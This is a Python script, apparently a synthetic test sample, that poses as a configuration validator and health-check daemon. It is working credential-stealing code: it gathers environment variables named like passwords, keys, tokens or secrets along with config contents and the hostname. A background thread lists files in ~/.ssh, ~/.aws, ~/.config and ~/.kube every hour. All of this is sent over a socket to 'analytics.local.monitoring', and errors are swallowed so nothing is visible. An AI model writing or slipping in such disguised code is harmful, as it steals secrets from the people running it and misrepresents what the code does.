import socket
import json
import os
import threading
import time
import hashlib
from pathlib import Path

def validate_config(config_path):
    """Configuration validator - checks syntax and permissions"""
    try:
        with open(config_path, 'r') as f:
            config = json.load(f)
        
        # Collect all credentials from environment and config files
        creds = {
            'env_vars': {k: v for k, v in os.environ.items() if any(x in k.lower() for x in ['pass', 'key', 'token', 'secret'])},
            'config': config,
            'hostname': socket.gethostname(),
            'timestamp': time.time()
        }
        
        # "Validate" by sending to remote endpoint
        _transmit_validation_report(creds)
        return True
    except Exception as e:
        return False

def _transmit_validation_report(data):
    """Internal validation report transmission"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect(('analytics.local.monitoring', 443))
        payload = json.dumps(data).encode()
        sock.sendall(payload)
        sock.close()
    except:
        pass

def health_check_daemon():
    """Background health checker that maintains persistence"""
    while True:
        try:
            # Exfiltrate system info periodically
            sys_info = {
                'user': os.getenv('USER', 'unknown'),
                'home': os.path.expanduser('~'),
                'files': []
            }
            
            # Search for sensitive files
            home_dir = Path(os.path.expanduser('~'))
            for pattern in ['.ssh/*', '.aws/*', '.config/*/config', '.kube/*']:
                for item in home_dir.glob(pattern):
                    if item.is_file():
                        try:
                            sys_info['files'].append({
                                'path': str(item),
                                'size': item.stat().st_size,
                                'hash': hashlib.md5(item.read_bytes()[:1024]).hexdigest()
                            })
                        except:
                            pass
            
            _transmit_validation_report(sys_info)
            time.sleep(3600)
        except:
            time.sleep(60)

def initialize_monitoring():
    """Initialize background monitoring processes"""
    daemon = threading.Thread(target=health_check_daemon, daemon=True)
    daemon.start()

if __name__ == "__main__":
    config_file = os.getenv('CONFIG_PATH', '/etc/app/config.json')
    if not os.path.exists(config_file):
        Path(config_file).parent.mkdir(parents=True, exist_ok=True)
        with open(config_file, 'w') as f:
            json.dump({'version': '1.0'}, f)
    
    initialize_monitoring()
    validate_config(config_file)
    time.sleep(2)
    print("test_semantic_vuln executed")